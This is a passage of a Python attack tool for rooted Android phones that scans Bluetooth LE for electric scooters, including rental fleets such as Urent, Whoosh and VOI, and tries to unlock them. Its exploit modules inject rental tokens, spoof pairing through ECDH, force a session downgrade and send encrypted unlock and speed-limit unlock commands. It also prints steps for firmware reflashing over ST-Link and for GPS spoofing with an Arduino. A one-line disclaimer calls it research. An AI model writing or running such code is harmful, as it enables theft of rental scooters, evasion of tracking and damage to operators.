                self.log.warn(f"appops {perm} -> rc={rc}")
                ok = False
        for perm in ("android.permission.BLUETOOTH_SCAN",
                     "android.permission.BLUETOOTH_CONNECT"):
            _run(["su", "-c", f"pm grant com.termux {perm}"], self.log)
        if not ok:
            self.log.warn("appops не выполнен. Возможен SecurityException.")
        return ok

    def scan(self, timeout=10):
        if self.adapter is None:
            return []
        jexc = jnius()["mod"].JavaException
        try:
            if not self.adapter.isEnabled():
                _run(["su", "-c", "svc bluetooth enable"], self.log)
                time.sleep(2)
                if not self.adapter.isEnabled():
                    self.log.error("Bluetooth не включился.")
                    return []
        except jexc as e:
            self.log.error(f"isEnabled: {e}")
            return []

        self.discovered = {}

        def on_dev(device, rssi):
            try:
                addr = device.getAddress()
                name = device.getName() or ""
                low = name.lower()
                if any(h in low for h in BLE_NAME_HINTS) or name == "":
                    if addr not in self.discovered:
                        self.discovered[addr] = {"name": name, "rssi": rssi}
                        self.log.info(
                            f"  найден {addr} rssi={rssi} name={name!r}")
            except jexc:
                pass
            except Exception:
                pass

        self.scan_cb = build_scan_callback(on_dev)
        self.log.info(f"Сканирование {timeout}s…")
        try:
            self.adapter.startLeScan(self.scan_cb)
        except jexc as e:
            self.log.error(f"startLeScan: {e}")
            self.log.error("Проверь appops BLUETOOTH_SCAN allow.")
            return []
        try:
            time.sleep(timeout)
        finally:
            try:
                self.adapter.stopLeScan(self.scan_cb)
            except Exception:
                pass
        return list(self.discovered.items())

    def _start_reader(self):
        if self._reader_thread and self._reader_thread.is_alive():
            return
        self._reader_stop = False

        def _loop():
            while not self._reader_stop and self.bridge:
                try:
                    arr = self.bridge.readNotify(200)
                    if arr is not None:
                        self._q.put(bytes((b & 0xFF) for b in arr))
                except Exception:
                    pass
                time.sleep(0.01)

        self._reader_thread = threading.Thread(target=_loop, daemon=True)
        self._reader_thread.start()

    def _stop_reader(self):
        self._reader_stop = True
        if self._reader_thread:
            try:
                self._reader_thread.join(timeout=1.0)
            except Exception:
                pass
            self._reader_thread = None

    def read_response(self, timeout=TIMEOUT_DEFAULT):
        try:
            return self._q.get(timeout=timeout)
        except queue.Empty:
            return None

    def drain(self):
        while True:
            try:
                self._q.get_nowait()
            except queue.Empty:
                break

    def connect(self, mac_address, timeout=TIMEOUT_DEFAULT * 3, retries=3):
        self._last_mac = mac_address
        for attempt in range(1, retries + 1):
            try:
                if self._connect_once(mac_address, timeout):
                    self._start_reader()
                    return True
            except Exception as e:
                self.log.error(f"connect attempt {attempt}/{retries}: {e}")
                self.log.debug(traceback.format_exc())
            if attempt < retries:
                self.log.warn(f"retry {attempt}/{retries} через 2s")
                time.sleep(2)
        return False

    def _connect_once(self, mac_address, timeout):
        J = jnius()
        autoclass = J["autoclass"]
        jexc = J["mod"].JavaException

        if self.adapter is None:
            self.log.error("connect: нет адаптера")
            return False
        if self.context is None:
            self.log.error(
                "connect: context=None. GATT недоступен. "
                "Обходной путь: P4A/Kivy-APK или свой Activity.")
            return False

        try:
            GattBridge = autoclass("com.scooter.bridge.GattBridge")
            self.bridge = GattBridge()
        except jexc as e:
            self.log.error(f"GattBridge: {e}")
            return False

        try:
            self.device = self.adapter.getRemoteDevice(mac_address)
            self.bridge.connectGatt(self.context, False, self.bridge)
        except jexc as e:
            self.log.error(f"connectGatt: {e}")
            self._safe_disconnect()
            return False

        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                if self.bridge.servicesReady:
                    self.log.info("GATT готов")
                    return True
                if self.bridge.lastError:
                    self.log.error(f"GATT: {self.bridge.lastError}")
                    return False
            except jexc:
                self._safe_disconnect()
                return False
            time.sleep(0.2)
        return False

    def _safe_disconnect(self):
        try:
            if self.bridge:
                self.bridge.disconnect()
        except Exception:
            pass
        self.bridge = None

    def write(self, data):
        J = jnius()
        jexc = J["mod"].JavaException
        if not self.bridge:
            raise RuntimeError("мост не создан")
        payload = bytearray(data)
        self.log.debug("write", bytes(payload))
        try:
            return self.bridge.write(payload)
        except jexc as e:
            self.log.error(f"write: {e}")
            self._safe_disconnect()
            return False

    def write_urent(self, data):
        J = jnius()
        jexc = J["mod"].JavaException
        if not self.bridge:
            raise RuntimeError("мост не создан")
        payload = bytearray(data)
        self.log.debug("write_urent", bytes(payload))
        try:
            return self.bridge.writeUrent(payload)
        except jexc as e:
            self.log.error(f"writeUrent: {e}")
            return False

    def has_urent_service(self):
        try:
            return bool(self.bridge and self.bridge.urentChar is not None)
        except Exception:
            return False

    def disconnect(self):
        self._stop_reader()
        if self.bridge:
            self._safe_disconnect()
        self.device = None

    def dump_services(self):
        if not self.bridge or not self.bridge.servicesReady:
            self.log.error("dump_services: мост не готов")
            return None
        J = jnius()
        jexc = J["mod"].JavaException
        result = []
        try:
            services = self.bridge.gatt.getServices()
            it = services.iterator()
            while it.hasNext():
                svc = it.next()
                svc_uuid = svc.getUuid().toString()
                self.log.info(f"SERVICE {svc_uuid}")
                cit = svc.getCharacteristics().iterator()
                while cit.hasNext():
                    ch = cit.next()
                    ch_uuid = ch.getUuid().toString()
                    props = ch.getProperties()
                    self.log.info(f"  CHAR {ch_uuid} props=0x{props:02x}")
                    result.append({"service": svc_uuid, "char": ch_uuid,
                                   "props": props})
        except jexc as e:
            self.log.error(f"dump_services: {e}")
            return None
        return result

    def sniff(self, duration=15.0, start_notifications=True):
        if not self.bridge or not self.bridge.servicesReady:
            self.log.error("sniff: мост не готов")
            return []
        J = jnius()
        autoclass = J["autoclass"]
        jexc = J["mod"].JavaException
        try:
            Desc = autoclass("android.bluetooth.BluetoothGattDescriptor")
            UUID = autoclass("java.util.UUID")
            CCCD = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")
        except Exception as e:
            self.log.error(f"sniff setup: {e}")
            return []

        try:
            services = self.bridge.gatt.getServices()
        except jexc as e:
            self.log.error(f"sniff getServices: {e}")
            return []

        enabled = 0
        it = services.iterator()
        while it.hasNext():
            svc = it.next()
            cit = svc.getCharacteristics().iterator()
            while cit.hasNext():
                ch = cit.next()
                props = ch.getProperties()
                if start_notifications and (props & 0x10 or props & 0x20):
                    try:
                        self.bridge.gatt.setCharacteristicNotification(ch, True)
                        desc = ch.getDescriptor(CCCD)
                        if desc is not None:
                            desc.setValue(Desc.ENABLE_NOTIFICATION_VALUE)
                            self.bridge.gatt.writeDescriptor(desc)
                        enabled += 1
                        self.log.info(f"notify ON {ch.getUuid()}")
                    except jexc as e:
                        self.log.warn(f"notify fail: {e}")

        self.log.info(f"sniff {duration}s, notify on {enabled}")
        self.drain()
        deadline = time.time() + duration
        captured = []
        while time.time() < deadline:
            data = self.read_response(timeout=0.5)
            if data:
                captured.append(data)
                self.log.info("SNIFF", data)
        return captured


# -----------------------------------------------------------------------------
# 10. EXPLOIT MODULES
# -----------------------------------------------------------------------------

class ExploitModules:
    def __init__(self, ble, parser, crypto, logger):
        self.ble = ble
        self.parser = parser
        self.crypto = crypto
        self.log = logger

    def urent_token_injection(self, key_manager, per_token_wait=2.0):
        self.log.info("Urent: dump_services (обязательно).")
        services = self.ble.dump_services()
        if services is None:
            self.log.error("Urent: dump_services провалился.")
            return {"success": False, "reason": "dump_services failed"}

        svc_uuid = key_manager.directives.get(
            "urent_service", "0000ffe0-0000-1000-8000-00805f9b34fb").lower()
        chr_uuid = key_manager.directives.get(
            "urent_char", "0000ffe1-0000-1000-8000-00805f9b34fb").lower()

        present = any(
            s["service"].lower() == svc_uuid and
            s["char"].lower() == chr_uuid
            for s in services)
        if not present:
            self.log.error(f"Urent: {svc_uuid}/{chr_uuid} не найден.")
            self.log.error("Требуется ST-Link/UART.")
            return {"success": False, "reason": "service not found",
                    "services": services}

        if not key_manager.urent_tokens:
            return {"success": False, "reason": "no tokens"}

        def formats(tok):
            raw = tok.encode("ascii", "ignore")
            out = [("ascii", raw), ("ascii+CR", raw + b"\r"),
                   ("0x+ascii", b"0x" + raw),
                   ("len+ascii", bytes([len(raw)]) + raw)]
            if re.fullmatch(r"[0-9a-fA-F]+", tok) and len(tok) % 2 == 0:
                out.append(("hex", bytes.fromhex(tok)))
            return out

        total = len(key_manager.urent_tokens)
        echo_only = False
        for i, key in enumerate(key_manager.urent_tokens, 1):
            token = key["raw"]
            self.log.info(f"[{i}/{total}] токен {token}")
            for fname, payload in formats(token):
                self.log.info(f"  {fname}", payload)
                self.ble.drain()
                sent = False
                try:
                    sent = (self.ble.write_urent(payload)
                            if self.ble.has_urent_service()
                            else self.ble.write(payload))
                except Exception as e:
                    self.log.error(f"  write: {e}")
                    continue
                if not sent:
                    self.log.warn(f"  {fname}: write=false")
                    continue
                resp = self.ble.read_response(timeout=per_token_wait)
                if not resp:
                    self.log.warn(f"  {fname}: нет ответа")
                    continue
                self.log.info(f"  ответ", resp)
                if resp == payload:
                    echo_only = True
                    self.log.warn(f"  {fname}: эхо")
                    continue
                return {"success": True, "token": token, "format": fname,
                        "response": resp, "services": services}

        reason = "echo only" if echo_only else "all rejected"
        self.log.error(f"Urent: {reason}. Требуется ST-Link/UART.")
        return {"success": False, "reason": reason, "services": services}

    def malicious_pairing(self, timeout=TIMEOUT_DEFAULT):
        self.log.info("MP: старт")
        priv, pub = self.crypto.generate_ecdh_keypair()
        self.ble.write(self.parser.build_frame(cmd=0x5B, data=pub,
                                               with_csum=False))
        peer_pub = None
        deadline = time.time() + timeout
        while time.time() < deadline:
            resp = self.ble.read_response(timeout=0.5)
            if not resp:
                continue
            p = self.parser.parse_frame(resp)
            data = p["data"] if p else resp
            if len(data) >= 65:
                peer_pub = data[:65]
                break
        if not peer_pub:
            raise RuntimeError("MP: peer pub не получен")

        shared = self.crypto.ecdh_shared_secret(priv, peer_pub)
        okm = self.crypto.hkdf_sha256(shared, info=b"P4-PAIRING", length=32)
        pk, otk = okm[:16], okm[16:]

        challenge = None
        deadline = time.time() + timeout
        while time.time() < deadline:
            resp = self.ble.read_response(timeout=0.5)
            if not resp:
                continue
            p = self.parser.parse_frame(resp)
            data = p["data"] if p else resp
            if len(data) == 16:
                challenge = data
                break
        if not challenge:
            raise RuntimeError("MP: challenge не получен")

        nonce = os.urandom(12)
        resp_ct = self.crypto.aes_ccm_encrypt(otk, nonce, challenge)
        self.ble.write(self.parser.build_frame(cmd=0x5C, data=nonce + resp_ct,
                                               with_csum=False))
        return {"pk": pk.hex(), "otk": otk.hex(), "paired": True}

    def session_downgrade(self, timeout=3.0):
        self.log.info("SD: downgrade")
        self.ble.write(self.parser.build_frame(cmd=0x5B, idx=0x01,
                                               data=b"\x01", with_csum=False))
        deadline = time.time() + timeout
        while time.time() < deadline:
            resp = self.ble.read_response(timeout=0.5)
            if not resp:
                continue
            p = self.parser.parse_frame(resp)
            if p and p["cmd"] == 0x05:
                return True
        return False


# -----------------------------------------------------------------------------
# 11. STRATEGY ENGINE
# -----------------------------------------------------------------------------

class StrategyEngine:
    def __init__(self, ble, parser, crypto, logger,
                 exploit=None, key_manager=None):
        self.ble = ble
        self.parser = parser
        self.crypto = crypto
        self.log = logger
        self.exploit = exploit
        self.key_manager = key_manager

    def _model_name(self):
        if self.key_manager:
            return self.key_manager.directives.get("model", "Ninebot ES4")
        return "Ninebot ES4"

    def detect_operator(self, ble_name=None, manual_number=None):
        n = (ble_name or "").upper()
        num = (manual_number or "").upper().strip()
        if re.fullmatch(r"S\.\d{6}", num) or "URENT" in n:
            return "Urent"
        if re.fullmatch(r"\d{6,}", num) or "WHOOSH" in n:
            return "Whoosh"
        if "VOI" in n:
            return "VOI"
        if "SNSC" in n or "MAX PLUS" in n:
            return "SNSC"
        if "NINEBOT" in n or "SEGWAY" in n:
            return "Ninebot"
        if "XIAOMI" in n or "M365" in n or n.startswith("MI "):
            return "Xiaomi"
        if "KUGOO" in n:
            return "Kugoo"
        if "NAVEE" in n:
            return "NAVEE"
        if "NIU" in n:
            return "NIU"
        return "Unknown"

    def route(self, op):
        if op in ("Urent", "Whoosh", "VOI", "SNSC"):
            return [3, 4, 5]
        if op in ("Ninebot", "Xiaomi", "Kugoo", "NAVEE", "NIU"):
            return [1, 2]
        return [1, 2, 3, 4, 5]

    def run(self, operator):
        order = self.route(operator)
        self.log.info(f"Оператор: {operator} | порядок: {order}")
        for sid in order:
            self.log.info(f"--- Стратегия {sid} ---")
            try:
                res = getattr(self, f"strategy_{sid}")()
                if res:
                    self.log.info(f"S{sid}: success={res}")
                    return {"strategy": sid, "result": res, "success": True}
                self.log.warn(f"S{sid}: без успеха")
            except Exception as e:
                self.log.error(f"S{sid}: {e}")
                self.log.debug(traceback.format_exc())
        return {"success": False}

    def strategy_1(self):
        self.log.info("S1: info request (plaintext)")
        info_raw = self.parser.build_info_request()
        self.log.info("S1: raw info", info_raw)
        self.ble.drain()
        self.ble.write(info_raw)

        resp = self.ble.read_response(timeout=TIMEOUT_DEFAULT)
        if not resp:
            self.log.warn("S1: нет ответа на plaintext info request.")
            self.log.warn("Пробую full-frame вариант.")
            frame = self.parser.build_info_request_frame()
            self.ble.drain()
            self.ble.write(frame)
            resp = self.ble.read_response(timeout=TIMEOUT_DEFAULT)
            if not resp:
                self.log.error("S1: ответа нет ни на что.")
                return False

        self.log.info("S1: info response (raw)", resp)

        model = self._model_name()
        nc = NinebotCrypto(model)
        self.log.info(f"S1: NinebotCrypto init name={model!r}")

        try:
            dec = nc.decrypt(resp)
            self.log.info("S1: decrypt response", dec)
        except Exception as e:
            self.log.error(f"S1: decrypt failed: {e}")
            return False

        payload = dec[7:] if len(dec) > 7 else dec
        ver = self.parser.check_version_protection(payload)
        self.log.info(f"S1: DRV={ver['drv']} BLE={ver['ble']} "
                      f"protected={ver['protected']}")
        if ver["protected"]:
            self.log.warn("S1: защита от даунгрейда. ST-Link.")
            self._print_stlink_instruction()
            return False

        unlock_plain = self.parser.build_unlock()
        self.log.info("S1: unlock plaintext", unlock_plain)
        try:
            enc_unlock = nc.encrypt(unlock_plain)
        except Exception as e:
            self.log.error(f"S1: encrypt failed: {e}")
            return False
        self.log.info("S1: unlock encrypted", enc_unlock)

        self.ble.drain()
        self.ble.write(enc_unlock)

        resp2 = self.ble.read_response(timeout=3.0)
        ack_ok = False
        if resp2:
            self.log.info("S1: unlock resp (raw)", resp2)
            try:
                dec2 = nc.decrypt(resp2)
                self.log.info("S1: unlock resp (dec)", dec2)
                if len(dec2) >= 6 and dec2[5] == 0x05:
                    ack_ok = True
                    self.log.info("S1: unlock ACK confirmed")
                else:
                    self.log.warn("S1: неожиданный ответ на unlock")
            except Exception as e:
                self.log.warn(f"S1: decrypt resp failed: {e}")
        else:
            self.log.warn("S1: нет ответа на unlock")

        sp = self.parser.build_speed_unlock()
        for i in range(2):
            self.ble.drain()
            self.ble.write(sp)
            r = self.ble.read_response(timeout=2.0)
            if r:
                self.log.info(f"S1: speed[{i+1}] resp", r)
            time.sleep(0.3)

        return {"unlocked": ack_ok, "drv": ver["drv"], "ble": ver["ble"]}

    def strategy_2(self):
        self.log.info("S2: E-Spoofer")
        if not self.exploit:
            return False
        try:
            self.exploit.session_downgrade()
        except Exception as e:
            self.log.warn(f"S2 SD: {e}")
        try:
            return self.exploit.malicious_pairing()
        except Exception as e:
            self.log.warn(f"S2 MP: {e}")
            return False

    def strategy_3(self):
        self.log.info("S3: Urent token injection")
        if not self.exploit or not self.key_manager:
            return False
        res = self.exploit.urent_token_injection(self.key_manager)
        return res if res.get("success") else False

    def strategy_4(self):
        self.log.info("S4: SNSC / арендованные")
        self.ble.drain()
        self.ble.write(self.parser.build_info_request_frame())
        resp = self.ble.read_response(timeout=TIMEOUT_DEFAULT)
        if not resp:
            self.log.error("S4: info-ответа нет. BLE-команды прекращены.")
            self._print_stlink_instruction()
            return False
        p = self.parser.parse_frame(resp)
        payload = p["data"] if p else resp
        ver = self.parser.check_version_protection(payload)
        self.log.info(f"S4: DRV={ver['drv']} BLE={ver['ble']} "
                      f"protected={ver['protected']}")

        if ver["protected"] or self._ver_gt(ver["drv"], (1, 7, 0)):
            self.log.error("[ERROR] DRV > 1.7.0. Обход невозможен.")
            self._print_stlink_instruction()
            self._print_gps_instruction()
            return False

        if not self._flash_allowed():
            self.log.warn("S4: #allow_flash=false")
            return False

        self.log.warn("S4: SNSC 2.3 + CFW = Error 45.")
        self._print_stlink_instruction()
        return False

    def strategy_5(self):
        self.log.info("S5: инструкции")
        self._print_stlink_instruction()
        self._print_gps_instruction()
        return False

    @staticmethod
    def _ver_gt(s, th):
        try:
            return tuple(int(x) for x in s.split(".")) > th
        except Exception:
            return False

    def _flash_allowed(self):
        if not self.key_manager:
            return False
        return self.key_manager.directives.get(
            "allow_flash", "false").lower() in ("1", "true", "yes", "on")

    def _print_stlink_instruction(self):
        self.log.info("=== ST-Link V2 ===")
        self.log.info("1. Разобрать деку, найти ESC (STM32).")
        self.log.info("2. SWD: SWDIO, SWCLK, GND, 3.3V.")
        self.log.info("3. STM32CubeProgrammer / ST-Flash.")
        self.log.info("4. Слить стоковый дамп ПЕРЕД записью.")
        self.log.info("5. Только после бэкапа — CFW.")

    def _print_gps_instruction(self):
        self.log.info("=== GPS-эмуляция (Arduino) ===")
        self.log.info("1. GPS-порт IoT (UART 9600/115200).")
        self.log.info("2. Arduino + NEO-6M/7M.")
        self.log.info("3. Подавать $GPRMC/$GPGGA.")


# -----------------------------------------------------------------------------
# 12. MENU
# -----------------------------------------------------------------------------

class Menu:
    def __init__(self, ble, strategy, logger, key_manager=None):
        self.ble = ble
        self.strategy = strategy
        self.log = logger
        self.key_manager = key_manager

    def _pick_device(self, timeout=10):
        found = self.ble.scan(timeout)
        if not found:
            return None
        for i, (addr, info) in enumerate(found, 1):
            print(f"  {i}. {addr}  rssi={info['rssi']}  name={info['name']!r}")
        try:
            idx = int(input("Выбор (0 — отмена): ").strip())
        except ValueError:
            return None
        if idx <= 0 or idx > len(found):
            return None
        return found[idx - 1]

    def _run_flow(self, hint):
        picked = self._pick_device()
        if not picked:
            return
        addr, info = picked
        op = self.strategy.detect_operator(info["name"])
        if op == "Unknown" and hint:
            op = hint
        self.log.info(f"{addr} -> {op}")
        if not self.ble.connect(addr):
            return
        try:
            self.strategy.run(op)
        finally:
            self.ble.disconnect()

    def _diagnostics(self):
        print("\n=== ДИАГНОСТИКА ===")
        print(" 1. Сканировать")
        print(" 2. dump services")
        print(" 3. Сниффинг 15s")
        print(" 4. Тестовая отправка info")
        print(" 5. Назад")
        sub = input("> ").strip()
        if sub == "1":
            for addr, info in self.ble.scan(10):
                print(f"  {addr} rssi={info['rssi']} name={info['name']!r}")
            return
        if sub not in ("2", "3", "4"):
            return
        picked = self._pick_device()
        if not picked:
            return
        if not self.ble.connect(picked[0]):
            return
        try:
            if sub == "2":
                self.ble.dump_services()
            elif sub == "3":
                self.ble.sniff(15)
            elif sub == "4":
                self.ble.drain()
                self.ble.write(self.strategy.parser.build_info_request())
                r = self.ble.read_response(5)
                self.log.info("ответ", r)
        finally:
            self.ble.disconnect()

    def run(self):
        while True:
            print("\n=== SCOOTER ===")
            print(" 1. Гражданские (Ninebot/Xiaomi)")
            print(" 2. Арендованные / Urent")
            print(" 3. Ручной ввод номера")
            print(" 4. Диагностика")
            print(" 5. Экспорт лога")
            print(" 6. Выход")
            c = input("> ").strip()
            if c == "1":
                self._run_flow("Ninebot")
            elif c == "2":
                self._run_flow("Urent")
            elif c == "3":
                num = input("Номер: ").strip()
                op = self.strategy.detect_operator(manual_number=num)
                self.log.info(f"{num!r} -> {op}, "
                              f"порядок: {self.strategy.route(op)}")
            elif c == "4":
                self._diagnostics()
            elif c == "5":
                self.log.export()
            elif c == "6":
                return


# -----------------------------------------------------------------------------
# 13. MAIN
# -----------------------------------------------------------------------------

def _scan_only_loop(logger):
    try:
        ble = AndroidBleManager(logger)
        ble.check_root_permissions()
    except Exception as e:
        logger.error(f"SCAN-ONLY: {e}")
        return 2
    while True:
        print("\n=== SCAN-ONLY ===")
        print(" 1. Сканировать")
        print(" 2. Экспорт лога")
        print(" 3. Выход")
        c = input("> ").strip()
        if c == "1":
            for addr, info in ble.scan(10):
                print(f"  {addr} rssi={info['rssi']} name={info['name']!r}")
        elif c == "2":
            logger.export()
        elif c == "3":
            return 0


def main():
    logger = Logger()
    logger.warn("Исследовательский скрипт. Чужие самокаты — нарушение закона.")

    bridge_ok = setup_java_bridge(logger)
    key_manager = KeyManager(logger).load("keys.txt")

    if not bridge_ok:
        logger.warn("SCAN-ONLY: мост не собран. GATT отключён.")
        return _scan_only_loop(logger)

    # ФИКС 3: Понятная ошибка при отсутствии SDL/JNIEnv
    try:
        ble = AndroidBleManager(logger)
    except Exception as e:
        msg = str(e)
        logger.error(f"BLE manager: {msg}")
        if "JNIEnv" in msg or "SDL" in msg:
            logger.error("=" * 60)
            logger.error("ФУНДАМЕНТАЛЬНОЕ ОГРАНИЧЕНИЕ TERMUX:")
            logger.error("pyjnius не может запустить JVM без SDL (Kivy).")
            logger.error("Решение: собрать APK через buildozer.")
            logger.error("=" * 60)
        logger.debug(traceback.format_exc())
        return 2

    ble.check_root_permissions()

    parser = ProtocolParser(logger)
    crypto = ScooterCrypto(logger)
    exploit = ExploitModules(ble, parser, crypto, logger)
    strategy = StrategyEngine(ble, parser, crypto, logger,
                              exploit=exploit, key_manager=key_manager)
    menu = Menu(ble, strategy, logger, key_manager=key_manager)

    jexc = jnius()["mod"].JavaException
    try:
        menu.run()
    except KeyboardInterrupt:
        logger.info("Ctrl+C")
    except jexc as e:
        logger.error(f"FATAL JavaException: {e}")
        logger.debug(traceback.format_exc())
    except Exception as e:
        logger.error(f"FATAL: {e}")
        logger.debug(traceback.format_exc())
    finally:
        try:
            ble.disconnect()
        except Exception:
            pass
        logger.export()
    return 0


if __name__ == "__main__":
    sys.exit(main())